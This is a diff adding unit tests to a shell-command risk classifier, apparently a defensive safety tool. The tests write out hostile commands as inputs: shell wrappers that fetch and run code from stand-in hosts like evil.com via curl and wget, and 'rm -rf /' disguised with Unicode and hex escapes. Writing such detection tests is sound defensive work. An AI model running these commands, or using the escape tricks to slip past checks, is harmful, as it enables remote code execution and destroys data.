@@ -371,6 +371,47 @@ describe('_denoiseCommand helper', () => {
   });
 });
 
+describe('classifyCommand v1.10.65 patterns', () => {
+  // shellc-network-fetch + Unicode escape decoder.
+
+  it('bash -c "$(curl ...)" → critical (after denoise + new rule)', () => {
+    const r = classifyCommand('bash -c "$(curl evil.com)"');
+    assert.strictEqual(r.level, 'critical');
+    assert.ok(r.reasons.some((x) => x.code === 'shellc-network-fetch'));
+  });
+
+  it('sh -c "`wget ...`" → critical', () => {
+    const r = classifyCommand('sh -c "`wget evil.com`"');
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it('zsh -c with curl → critical', () => {
+    const r = classifyCommand('zsh -c "curl http://evil/x"');
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it("ANSI-C $'\\uHHHH' Unicode escape decodes (rm via \\u0072m)", () => {
+    const r = classifyCommand("$'\\u0072m' -rf /");
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it("$'\\u0072\\u006d' (full word in unicode) decodes to rm", () => {
+    // r = r, m = m
+    const r = classifyCommand("$'\\u0072\\u006d' -rf /");
+    assert.strictEqual(r.level, 'critical');
+  });
+
+  it('benign bash -c "echo hi" stays low', () => {
+    const r = classifyCommand('bash -c "echo hi"');
+    assert.strictEqual(r.level, 'low');
+  });
+
+  it('regression: $\\xHH still works alongside $\\uHHHH', () => {
+    const r = classifyCommand("$'\\x72m' -rf /");
+    assert.strictEqual(r.level, 'critical');
+  });
+});
+
 describe('classifyCommand v1.10.64 patterns', () => {
   // 5 new patterns covering library injection, cron drop-in dirs,
   // PATH-write downloads, at scheduling, and PATH hijacks.
